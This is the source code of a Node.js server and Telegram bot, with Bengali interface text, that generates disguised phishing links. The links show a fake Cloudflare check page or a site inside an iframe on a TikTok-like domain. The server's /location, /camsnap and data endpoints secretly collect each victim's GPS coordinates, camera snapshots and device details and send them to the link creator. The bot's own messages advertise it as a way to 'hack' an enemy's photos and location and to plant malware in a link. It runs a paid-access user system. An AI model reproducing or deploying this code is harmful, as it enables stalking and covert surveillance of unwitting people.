const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

// --- কনফিগারেশন ---
const token = process.env["bot"]; // আপনার টোকেন এনভায়রনমেন্ট ভেরিয়েবল থেকে নেওয়া হচ্ছে
const bot = new TelegramBot(token, {polling: true}); 
//Modify your URL here
var hostURL="https://tiktok-official.onrender.com";
var usecodetabs=false;

// আপনার Telegram User ID, যাকে Bot এর অ্যাডমিন বানানো হবে
const ownerId = 6246410156; 
// -----------------


var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// অনুমোদিত ব্যবহারকারীদের তালিকা লোড করা (বট ব্যবহারের অনুমতি)
let allowedUsers = {};
try {
    allowedUsers = JSON.parse(fs.readFileSync('users.json', 'utf8'));
} catch (error) {
    // ফাইল না থাকলে অ্যাডমিনকে স্বয়ংক্রিয়ভাবে যুক্ত করা
    allowedUsers[ownerId] = {
        expires: 'forever'
    };
    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
}

// সকল ব্যবহারকারীদের তালিকা লোড করা (ব্রডকাস্টের জন্য)
let allUsers = new Set();
try {
    const savedUsers = JSON.parse(fs.readFileSync('all_users.json', 'utf8'));
    allUsers = new Set(savedUsers);
} catch (error) {
    fs.writeFileSync('all_users.json', JSON.stringify(Array.from(allUsers), null, 2));
}

// সকল ব্যবহারকারীদের তালিকা সেভ করার ফাংশন
function saveAllUsers() {
    fs.writeFileSync('all_users.json', JSON.stringify(Array.from(allUsers), null, 2));
}

// Bot কখন চালু হয়েছে, তা ট্র্যাক করার জন্য
const startTime = new Date();

// --- বট স্টার্টআপ নোটিফিকেশন ---
bot.sendMessage(ownerId, '✅ বট সফলভাবে চালু হয়েছে! স্টার্টআপ টাইম: ' + startTime.toLocaleString('bn-BD'));
// -----------------------------


// ইউজারকে অনুমতি আছে কিনা চেক করার ফাংশন
function isAllowed(userId) {
    if (userId === ownerId) {
        return true;
    }
    const user = allowedUsers[userId];
    if (!user) {
        return false;
    }
    if (user.expires === 'forever') {
        return true;
    }
    return new Date() < new Date(user.expires);
}

// অনুমোদিত ব্যবহারকারীদের তালিকা সেভ করার ফাংশন
function saveAllowedUsers() {
    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
}

// ⭐ ছবি সহ ব্রডকাস্ট ফাংশন (সকল ইউজারের কাছে যাবে)
async function broadcastToAllUsers(adminChatId, message, photoFileIdOrUrl = null) {
    const userIds = Array.from(allUsers);
    let successCount = 0;
    let failedCount = 0;

    bot.sendMessage(adminChatId, `📣 ${userIds.length} জন ব্যবহারকারীকে বার্তা/ছবি পাঠানো শুরু হচ্ছে...`);

    for (const userId of userIds) {
        const targetChatId = parseInt(userId, 10);
        
        // অ্যাডমিনকে নিজের কাছে মেসেজ পাঠানো থেকে বিরত রাখা
        if (targetChatId === adminChatId) continue; 
        
        try {
            if (photoFileIdOrUrl) {
                await bot.sendPhoto(targetChatId, photoFileIdOrUrl, { 
                    caption: message 
                });
            } else {
                await bot.sendMessage(targetChatId, message);
            }
            successCount++;
            // রেট-লিমিট এড়াতে অপেক্ষার সময় 300ms করা হলো
            await new Promise(resolve => setTimeout(resolve, 300)); 
        } catch (error) {
            console.error(`Error sending message/photo to ${targetChatId}:`, error.message);
            failedCount++;
        }
    }

    bot.sendMessage(adminChatId, `✅ ব্রডকাস্ট সম্পন্ন!\nসফলভাবে পাঠানো হয়েছে: ${successCount} জনের কাছে।\nব্যর্থ হয়েছে: ${failedCount} টি।`);
}
// ⭐ ব্রডকাস্ট ফাংশন শেষ

// --- ওয়েবভিউ রুটস ---
app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:usecodetabs});
}
else{
res.redirect("https://t.me/ehtool");
}
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:usecodetabs});
}
else{
res.redirect("https://t.me/ehtool");
}
});
// ---------------------


bot.on('message', async (msg) => {
const chatId = msg.chat.id;
const msgText = msg.text;

// 1. সকল ইউজার আইডি সেভ করা
if (!allUsers.has(chatId.toString())) {
    allUsers.add(chatId.toString());
    saveAllUsers();
}

// 2. 🛑 স্ট্রিক্ট পারমিশন ব্যারিয়ার (এমনকি /start এর আগেও)
if (!isAllowed(chatId)) {
    // যদি ইউজার allowed না হয়, তাহলে সমস্ত মেসেজ ব্লক করা হবে।
    bot.sendMessage(chatId, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉\n\n\nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
    return; // এখানেই কোড এক্সিকিউশন শেষ
}

// --- এখন থেকে শুধুমাত্র Allowed ইউজাররাই কোড এক্সিকিউট করবে ---

// 3. /start কমান্ড হ্যান্ডলিং
if(msgText=="/start"){ 
    var m={
        reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
    };
    bot.sendMessage(chatId, `আসসালামু আলাইকুম, ${msg.chat.first_name} ! , \nআপনি এই বট ব্যবহার করে সামান্য একটি লিঙ্ক পাঠিয়ে আপনার শত্রুর ছবি, লোকেশন এবং তার ডিভাইসের বিভিন্ন তথ্য হ্যাক করে নিতে পারবেন।\n\nআরোও তথ্য জানার জন্য টাইপ করুন, /help`,m);
}
// 4. রিপ্লাই মেসেজ হ্যান্ডলিং (লিঙ্ক ক্রিয়েশন)
else if(msgText && msg.reply_to_message?.text=="🌐 আপনার লিঙ্কটি দিন"){
    createLink(chatId,msgText); 
}
// 5. /msg কমান্ড (নির্দিষ্ট ইউজারকে মেসেজ, ছবি সাপোর্টেড)
else if (msgText && msgText.startsWith('/msg')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
        return;
    }

    const parts = msgText.trim().split(/\s+/); 
    
    if (parts.length < 2) { 
        bot.sendMessage(chatId, '⚠️ সঠিক ব্যবহার:\n/msg <ইউজার_আইডি> <আপনার বার্তা>\n(ছবি সহ পাঠানোর জন্য ছবিতে রিপ্লাই দিন)');
        return;
    }

    const targetUserId = parseInt(parts[1], 10);
    // ছবির ক্যাপশন বা টেক্সট মেসেজ
    const messageToSend = parts.length > 2 ? parts.slice(2).join(' ') : ''; 
    let photoFileId = null;

    if (msg.reply_to_message && msg.reply_to_message.photo) {
        // রিপ্লাই করা ছবিতে ফাইল আইডি চেক করা হচ্ছে
        photoFileId = msg.reply_to_message.photo.pop().file_id;
    }

    if (isNaN(targetUserId)) {
        bot.sendMessage(chatId, '⚠️ ইউজার আইডি সঠিক নয়। এটি একটি সংখ্যা হতে হবে।');
        return;
    }
    
    // ছবি বা মেসেজ না থাকলে এরর দেওয়া
    if (!photoFileId && messageToSend.length === 0) {
         bot.sendMessage(chatId, '⚠️ আপনি কোনো মেসেজ বা ছবি দেননি।');
         return;
    }

    try {
        if (photoFileId) {
            // ছবি সহ মেসেজ
            await bot.sendPhoto(targetUserId, photoFileId, { caption: messageToSend });
        } else {
            // শুধুমাত্র টেক্সট মেসেজ
            await bot.sendMessage(targetUserId, messageToSend);
        }
        
        bot.sendMessage(chatId, `✅ ইউজার আইডি ${targetUserId} কে বার্তা/ছবি পাঠানো সফল হয়েছে।`);
    } catch (error) {
        console.error(`Error sending direct message to ${targetUserId}:`, error.message);
        bot.sendMessage(chatId, `❌ বার্তা পাঠানো ব্যর্থ হয়েছে। কারণ: ইউজার বট ব্লক করে থাকতে পারে, অথবা আইডি ভুল।\n\nত্রুটি: ${error.message}`);
    }
}
// 6. /userlist কমান্ড (ইন্টারেক্টিভ)
else if (msgText === '/userlist') {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
        return;
    }
    
    const userIds = Array.from(allUsers);
    const allowedCount = Object.keys(allowedUsers).length;
    
    let userList = `👥বটের সকল ইউজারের তালিকা:\n\n`;
    userList += `সর্বমোট ইউজার: ${userIds.length}\nঅনুমোদিত ইউজার: ${allowedCount} জন\n\n`;

    const displayLimit = 30; // মেসেজের আকার সীমিত রাখতে প্রথম 30 জন ইউজারকে দেখানো হচ্ছে
    if (userIds.length > 0) {
        userList += `--- প্রথম ${Math.min(userIds.length, displayLimit)} জন ইউজারের ID ও স্ট্যাটাস ---\n\n`;
        
        for (let i = 0; i < Math.min(userIds.length, displayLimit); i++) {
            const id = userIds[i];
            const isUserAllowed = isAllowed(parseInt(id, 10));
            const status = isUserAllowed ? '✅ Allowed' : '❌ Disallowed';
            
            let userName = `User ID: ${id}`; // ডিফল্ট নাম
            
            try {
                // ইউজার ডেটা ফেচ করা হচ্ছে নাম এবং ক্লিকযোগ্য লিঙ্কের জন্য
                const chatInfo = await bot.getChat(id);
                const firstName = chatInfo.first_name || "Unknown";
                const username = chatInfo.username;
                
                if (username) {
                    userName = `[${firstName}](https://t.me/${username})`; // Username থাকলে clickable link
                } else {
                    userName = `[${firstName}](tg://user?id=${id})`; // না থাকলে ID দিয়ে clickable link
                }
            } catch (error) {
                // যদি ইউজার বট ব্লক করে থাকে, তাহলে getChat ফেইল করবে
                userName = `[Blocked/Unknown User] (ID: ${id})`;
            }
            
            userList += `${i + 1}. ${userName} (${status})\n`;

            // টেলিগ্রাম API রেট লিমিট এড়াতে সামান্য অপেক্ষা
            await new Promise(resolve => setTimeout(resolve, 50)); 
        }
        
        if (userIds.length > displayLimit) {
            userList += `\n... বাকি ${userIds.length - displayLimit} জনের তালিকা দেখানো সম্ভব হচ্ছে না।`;
        }
    } else {
        userList += `বর্তমানে আপনার বটের কোনো ইউজার নেই।`;
    }
    
    bot.sendMessage(chatId, userList, { parse_mode: 'Markdown', disable_web_page_preview: true });
}
else if(msgText=="/create"){
createNew(chatId);
}
else if(msgText=="/help"){
bot.sendMessage(chatId,`এই বটের মাধ্যমে আপনি কেবল একটি সহজ লিঙ্ক পাঠিয়ে মানুষদের ট্র্যাক করতে পারবেন।\n\nপ্রথমে /create লিখে সেন্ড করুন, তারপর বট আপনার কাছে একটা লিঙ্ক চাইবে, আমি যেকেনো একটা ভিডিও এর লিঙ্ক দিয়ে দিবেন।\nআপনার থেকে লিঙ্ক পেলে বট আপনার লিঙ্কে ম্যালওয়ার বসিয়ে আপনাকে আবার ২ টা লিঙ্ক দিবে।
\n\nSpecifications.
\n1. Cloudflare Link: এই পদ্ধতিতে তথ্য সংগ্রহের জন্য একটি ক্লাউডফ্লেয়ার আন্ডার অ্যাটাক পৃষ্ঠা দেখানো হবে এবং পরে ভিকটিমকে গন্তব্যস্থলের URL-এ পুনঃনির্দেশিত করা হবে।
\n2. Webview Link: এটি তথ্য সংগ্রহের জন্য আইফ্রেম ব্যবহার করে একটি ওয়েবসাইট (Ex bing, Dating site ইত্যাদি) দেখাবে।.
( ⚠️অনেক সাইটে x-ফ্রেম হেডার থাকলে এই পদ্ধতিতে কাজ নাও করতে পারে। যেমন https://google.com )
\n\nঅবশ্যই আমাদের চ্যানেলে জয়েন হবেন আরোও টুলস পাওয়ার জন্য\n Telegram Channel : https://t.me/ehtool\nFacebook Page : https://www.facebook.com/profile.php?id=61580675061865
`);
}
// ⭐ ব্রডকাস্ট কমান্ড
else if (msgText && msgText.startsWith('/broadcast')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
        return;
    }

    const broadcastMessage = msgText.substring('/broadcast'.length).trim();
    let photoFileId = null;

    if (msg.reply_to_message && msg.reply_to_message.photo) {
        photoFileId = msg.reply_to_message.photo.pop().file_id;
    }

    if (broadcastMessage.length === 0 && !photoFileId) {
        bot.sendMessage(chatId, '⚠️ সঠিক ব্যবহার:\n/broadcast <আপনার বার্তার টেক্সট>\nঅথবা একটি ছবিতে রিপ্লাই দিয়ে\n/broadcast <ক্যাপশন>');
        return;
    }

    broadcastToAllUsers(chatId, broadcastMessage, photoFileId);
}
// অন্যান্য অ্যাডমিন কমান্ড...
else if (msgText && msgText.startsWith('/allow')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
        return;
    }
    const parts = msgText.split(' ');
    if (parts.length >= 2) {
        const userIdToAdd = parseInt(parts[1], 10);
        if (isNaN(userIdToAdd)) {
            bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id> [সময়]`);
            return;
        }

        let duration = 'forever';
        let expiresAt = 'forever';
        
        if (parts.length > 2) {
            duration = parts.slice(2).join(' ');
            const now = new Date();
            const timeValue = parseInt(duration);
            
            if (isNaN(timeValue)) {
                bot.sendMessage(chatId, `⚠️ সময় ("${duration}") সঠিক নয়। সময় অবশ্যই একটি সংখ্যা এবং তার পিছনে একক (যেমন 5m, 2h, 1d) হতে হবে।`);
                return;
            }
            
            let timeSet = false;
            if (duration.endsWith('m')) {
                now.setMinutes(now.getMinutes() + timeValue);
                timeSet = true;
            } else if (duration.endsWith('h')) {
                now.setHours(now.getHours() + timeValue);
                timeSet = true;
            } else if (duration.endsWith('d')) {
                now.setDate(now.getDate() + timeValue);
                timeSet = true;
            } 
            
            if (timeSet) {
                if (!isNaN(now.getTime())) {
                    expiresAt = now.toISOString(); 
                } else {
                     bot.sendMessage(chatId, `⚠️ দুঃখিত, সময় গণনাতে একটি গুরুতর সমস্যা হয়েছে। আবার চেষ্টা করুন।`);
                     return;
                }
            } else {
                bot.sendMessage(chatId, `⚠️ সময় ("${duration}") সঠিক নয়। সময় অবশ্যই একটি সংখ্যা এবং তার পিছনে একক (যেমন 5m, 2h, 1d) হতে হবে।`);
                return;
            }
        }
        
        allowedUsers[userIdToAdd] = { expires: expiresAt };
        saveAllowedUsers();

        const messageToUser = expiresAt === 'forever' ?
            `অভিনন্দন! আপনাকে লাইফটাইমের জন্য বট ব্যবহারের অনুমতি দেওয়া হয়েছে।` :
            `অভিনন্দন! আপনাকে ${duration} সময়ের জন্য বট ব্যবহারের অনুমতি দেওয়া হয়েছে।`;
        
        bot.sendMessage(userIdToAdd, messageToUser);
        bot.sendMessage(chatId, `ইউজার আইডি ${userIdToAdd} সফলভাবে অনুমোদিত তালিকায় যুক্ত করা হয়েছে (${duration} এর জন্য)।`);

    } else {
        bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id> [সময়]`);
    }
}
else if (msgText && msgText.startsWith('/disallow')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
        return;
    }
    const parts = msgText.split(' ');
    if (parts.length === 2) {
        const userIdToRemove = parseInt(parts[1], 10);
        if (!isNaN(userIdToRemove)) {
            if (allowedUsers[userIdToRemove]) {
                delete allowedUsers[userIdToRemove];
                saveAllowedUsers();
                bot.sendMessage(userIdToRemove, `দুঃখিত, আপনার বট ব্যবহারের অনুমতি প্রত্যাহার করা হয়েছে।`);
                bot.sendMessage(chatId, `ইউজার আইডি ${userIdToRemove} সফলভাবে অনুমোদিত তালিকা থেকে সরানো হয়েছে।`);
            } else {
                bot.sendMessage(chatId, `ইউজার আইডি ${userIdToRemove} অনুমোদিত তালিকায় নেই।`);
            }
        } else {
            bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /disallow <user_id>`);
        }
    } else {
        bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /disallow <user_id>`);
    }
}
else if (msgText === '/uptime') {
    const uptimeInSeconds = Math.floor((new Date() - startTime) / 1000);
    const hours = Math.floor(uptimeInSeconds / 3600);
    const minutes = Math.floor((uptimeInSeconds % 3600) / 60);
    const seconds = uptimeInSeconds % 60;
    bot.sendMessage(chatId, `বটটি চালু আছে ${hours} ঘন্টা, ${minutes} মিনিট, এবং ${seconds} সেকেন্ড ধরে।`);
}
// যদি কোনো টেক্সট মেসেজ না থাকে (যেমন ছবি, স্টিকার), তাহলে এখানে শেষ হবে।
else if (!msgText) {
    return;
}
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
// 🛑 ফিক্স: কঠোর পারমিশন চেক (callback এর জন্যও)
if (!isAllowed(callbackQuery.from.id)) {
    bot.sendMessage(callbackQuery.from.id, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉/n/n/nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
    return;
}
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
}
});

bot.on('polling_error', (error) => {
//console.log(error.code);
});


// 🎯 সংশোধিত createLink ফাংশন 
async function createLink(cid, msg) {
    if (typeof msg !== 'string' || msg.length === 0) {
        bot.sendMessage(cid, `⚠️ দুঃখিত, আপনি কোনো সঠিক লিঙ্ক দেননি বা আপনার বার্তাটি টেক্সট ফরম্যাটে নেই।`);
        createNew(cid);
        return; 
    }

    var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

    if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {

        var url = cid.toString(36) + '/' + btoa(msg);
        var m = {
            reply_markup: JSON.stringify({
                "inline_keyboard": [
                    [{
                        text: "Create new Link",
                        callback_data: "crenew"
                    }]
                ]
            })
        };

        var cUrl = `${hostURL}/c/${url}`;
        var wUrl = `${hostURL}/w/${url}`;

        bot.sendChatAction(cid, "typing");
        if (usecodetabs) {
            var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.codetabs.com/v1/proxy/?quest=" + cUrl)}`).then(res => res.json());
            var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.codetabs.com/v1/proxy/?quest=" + wUrl)}`).then(res => res.json());

            var f = "",
                g = "";

            for (var c in x) {
                f += x[c] + "\n";
            }

            for (var c in y) {
                g += y[c] + "\n";
            }

            bot.sendMessage(cid, `নতুন লিঙ্কগুলি সফলভাবে তৈরি করা হয়েছে। আপনি নীচের যেকোনো একটি লিঙ্ক ব্যবহার করতে পারেন।.\nURL: ${msg}\n\n✅আপনার লিঙ্কগুলো\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
        } else {

            bot.sendMessage(cid, `নতুন লিঙ্কগুলি সফলভাবে তৈরি করা হয়েছে।\nURL: ${msg}\n\n✅আপনার লিঙ্কগুলো\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
        }
    } else {
        bot.sendMessage(cid, `⚠️ দয়া করে একটি সঠিক লিঙ্ক দিন , লিঙ্কে অবশ্যই http অথবা https থাকতে হবে।`);
        createNew(cid);
    }
}
// 🎯 createLink ফাংশন শেষ


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 আপনার লিঙ্কটি দিন`,mk);
}


app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});


});


app.post("/location",(req,res)=>{

var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);

res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null;
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});


res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
    var uid=decodeURIComponent(req.body.uid) || null;
    var img=decodeURIComponent(req.body.img) || null;

    if(uid != null && img != null){
        
        const base64Data = img;
        if (!base64Data) {
            console.log("Empty Base64 data.");
            res.send("Empty Base64 Data");
            return;
        }

        try {
            var buffer=Buffer.from(base64Data,'base64');
            var info={
                filename:"camsnap.png",
                contentType: 'image/png'
            };

            bot.sendPhoto(parseInt(uid,36),buffer,{},info);
            res.send("Done");

        } catch (error) {
            console.log("Error processing image:", error);
            bot.sendMessage(parseInt(uid,36), `⚠️ দুঃখিত, ছবি প্রসেস করার সময় একটি সমস্যা হয়েছে।`);
            res.send("Error");
        }
    } else {
        res.send("No Data");
    }
});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
